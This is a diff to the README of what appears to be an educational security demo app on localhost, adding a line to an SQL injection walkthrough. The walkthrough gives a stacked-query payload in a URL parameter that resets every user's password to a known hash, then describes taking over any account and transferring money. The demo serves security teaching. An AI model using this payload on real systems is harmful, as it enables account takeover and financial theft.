@@ -25,6 +25,7 @@ or download [ZIP file](https://github.com/intraworlds/zcu-security-demo/archive/
 
 #### SQL injection
 - go to http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=email,password=%27%242y%2410%24vXUP3XG34Nwezd8cEZm0XOLUN5jtDsF6tqpMg.PvFacpzKStHA2ze%27;
+- notice added command `update users set name=email,password='$2y$10$vXUP3XG34Nwezd8cEZm0XOLUN5jtDsF6tqpMg.PvFacpzKStHA2ze'`
 - refresh page
 - observe that all users are named by its email and theirs password is `123`
 - so now you can access any account and transfer a money
